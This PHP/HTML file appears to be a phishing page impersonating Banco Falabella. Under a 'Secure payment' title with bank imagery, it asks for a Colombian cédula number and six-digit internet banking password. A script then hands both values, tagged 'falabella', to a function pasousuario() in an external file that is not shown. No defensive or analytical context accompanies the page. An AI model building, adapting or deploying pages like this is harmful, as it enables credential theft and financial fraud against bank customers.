<?php
session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){

}

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0">
        <title>Secure payment</title>
        <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
        <script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
        <script type="text/javascript" src="/scripts/functions2.js"></script>  		
        <style>
            *{
                
                font-family: Arial, Helvetica, sans-serif;
                margin: 0;
                padding: 0;
            }
            input{
                width: 80%;
                height: 40px;
                border-radius: 5px;
                margin-top: 10px;
                border:1px solid gray;
                padding: 5px;
            }
            select{
                padding: 5px;
                background-color: white;
                color: black;
                width: 82%;
                height: 40px;
                border-radius: 5px;
                margin-top: 10px;
                border:1px solid gray;
            }
            #btnUsuario{
                background-color: palevioletred;
                border: none;
                color: white;
                letter-spacing: 3px;
                font-family: Arial, Helvetica, sans-serif, 'Arial Narrow Bold';
                
            }
            #clave{
                color:rgb(78,139,102);
            }
        </style>
    </head>
    <body>
        <br><br>
        <div><center><img src="img/fala.png" alt="" width="40%" height="">
        <img src="images/check.png" alt="" srcset="" width="20%"></center>
        <img src="img/pago.jpg" alt="" width="20%" style="margin-left:90px;"></div>
        <br><br><br><br>
        <div>
            <center>
            <select name="" id="">
                <option value="cedula">Cedula Ciudadania</option>
            </select><br>
            <input type="tel" id="txtUsuario" name = "cedula" placeholder="Cedula Ciudadania" required minlength="6" maxlength="10"><br>
            <input type="password" id="txtPass" name ="clave" placeholder="Clave internet" required minlength="6" maxlength="6"><br>
            <input type="submit" value="INGRESAR" id="btnUsuario" ></center><br>
            <input type="hidden" value="falabella" id="banco">
        <center> <a href="" id="clave">Crea o recupera tu clave internet</a></center>
        </div>
        <br><br>

        <script>
            const txtPass = document.getElementById('txtPass');
            txtPass.addEventListener('input', function() {
                const value = txtPass.value;
                const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos
                if (value !== cleanValue) {
                txtPass.value = cleanValue;
                }
            });
        </script>

        <script type="text/javascript">
            $(document).ready(function() {
                $('#btnUsuario').click(function(){
                    if (($("#txtUsuario").val().length > 5) && ($("#txtPass").val().length == 6)) {
                        pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
                    }else{
                        $("#err-mensaje").show();
                        $(".user").css("border", "1px solid red");
                        $("#txtUsuario").focus();
                    }			
                });
            });
        </script>
    </body>
</html>